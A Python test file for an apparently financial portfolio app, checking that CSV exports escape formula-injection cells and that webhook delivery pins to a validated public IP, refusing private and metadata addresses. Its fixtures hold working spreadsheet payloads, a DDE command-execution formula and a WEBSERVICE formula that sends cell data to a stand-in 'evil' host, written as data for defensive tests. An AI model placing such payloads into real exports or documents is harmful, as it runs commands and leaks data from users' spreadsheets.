"""M2 + M6 regressions: CSV formula-injection neutralization on portfolio export, and
webhook connection pinning that closes the DNS-rebinding window."""
from __future__ import annotations

import pytest

from src.services import portfolio_service, webhook_service
from src.services.webhook_service import WebhookError


def test_csv_export_neutralizes_formula_injection():
    """M2: a deal named '=WEBSERVICE(...)' must render as literal text in a spreadsheet, not
    execute. Free-text cells beginning with a formula trigger are apostrophe-escaped."""
    dashboard = {
        "deals": [
            {
                "code": "=cmd|'/c calc'!A1",
                "name": '=WEBSERVICE("http://evil/?"&A1)',
                "target_company": "+1234",
                "fund_name": "@SUM(A1)",
                "strategy": "-2+3",
                "sector": "Legitimate Sector",  # normal value stays untouched
                "stage": "screening",
                "status": "active",
                "ic_date": None,
                "stage_age_days": 5,
                "readiness_score": 42.0,
                "source_health": {"status": "ready"},
                "financial_quality": {
                    "mapping_coverage": 100.0,
                    "reconciliation_score": 100.0,
                    "open_exceptions": 0,
                },
            }
        ]
    }
    csv_text = portfolio_service.export_dashboard_csv(dashboard)
    row = csv_text.splitlines()[1]
    # Every dangerous prefix is escaped; the benign sector is not mangled.
    assert "'=cmd" in row
    assert "'=WEBSERVICE" in row
    assert "'+1234" in row
    assert "'@SUM" in row
    assert "'-2+3" in row
    assert "Legitimate Sector" in row
    # Every hostile cell now starts with the neutralizing apostrophe.
    assert not row.startswith("=")


def test_csv_safe_passes_through_non_hostile_values():
    assert portfolio_service._csv_safe("Acme Corp") == "Acme Corp"
    assert portfolio_service._csv_safe(42) == 42
    assert portfolio_service._csv_safe("") == ""
    assert portfolio_service._csv_safe("=danger") == "'=danger"


def test_webhook_destination_is_pinned_to_a_validated_public_ip(monkeypatch):
    """M6: the connection targets the exact IP that passed validation, while Host/SNI keep the
    hostname — so a rebind to a private IP after validation cannot happen."""
    # Resolve the hostname to a single public IP for a deterministic assertion.
    monkeypatch.setattr(
        webhook_service.socket,
        "getaddrinfo",
        lambda host, *a, **k: [(2, 1, 6, "", ("8.8.8.8", 0))],
    )
    connect_url, headers, extensions = webhook_service._pinned_destination(
        "https://hook.example.com/deliver"
    )
    assert connect_url == "https://8.8.8.8/deliver"
    assert headers["Host"] == "hook.example.com"
    assert extensions["sni_hostname"] == "hook.example.com"


def test_webhook_rejects_host_that_resolves_to_private_ip(monkeypatch):
    """M6: a hostname resolving to a private/link-local address is refused at pin time —
    the same guard that blocks the cloud metadata endpoint."""
    monkeypatch.setattr(
        webhook_service.socket,
        "getaddrinfo",
        lambda host, *a, **k: [(2, 1, 6, "", ("169.254.169.254", 0))],
    )
    with pytest.raises(WebhookError, match="public IP"):
        webhook_service._pinned_destination("https://rebind.example.com/deliver")
